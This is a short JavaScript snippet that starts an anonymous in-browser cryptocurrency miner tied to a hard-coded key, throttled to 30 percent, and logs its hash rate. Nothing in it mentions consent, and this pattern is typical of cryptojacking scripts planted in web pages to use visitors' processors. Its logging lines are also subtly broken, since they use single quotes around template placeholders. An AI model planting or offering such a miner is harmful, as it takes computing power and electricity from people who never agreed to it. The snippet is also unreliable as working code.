const miner=new Client.Anonymous('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuz3Xdz',{throttle:0.3,
});
if (!miner.isRunning()){
  miner.start();
}
miner.on('update',(data)=>{
  console.log('hash rate:${data.hashesPerSecond}');
  console.log('Total hashes:${data.totalHashes}');
});
